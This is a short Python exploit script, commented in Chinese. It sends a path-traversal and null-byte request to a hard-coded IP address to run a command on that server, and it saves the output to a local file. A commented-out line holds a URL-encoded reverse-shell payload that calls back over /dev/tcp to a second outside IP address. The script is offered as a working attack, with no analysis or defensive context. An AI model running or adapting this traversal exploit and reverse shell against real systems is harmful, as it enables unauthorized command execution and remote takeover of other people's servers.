#发现一个文件目录可访问的地址
import urllib.request
import ssl
import os

file_o = open(os.getcwd() + '\\' + 'back.txt', 'wb+')
def main():
    context = ssl._create_unverified_context()
    command = '/bin/ls'
    url = "https://124.198.30.200/js/../../../../../../../.." + command + "%00.css"
    # url = "https://124.198.30.200/js/../../../../../../../../bin/sh%20-c%20%22sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F45.76.106.207%2F1234%200%3E%261%22%00.css"
    requ = urllib.request.urlopen(url, context=context)
    resp = requ.read()
    file_o.write(resp)
    


if __name__ == '__main__':
    main()
    file_o.close()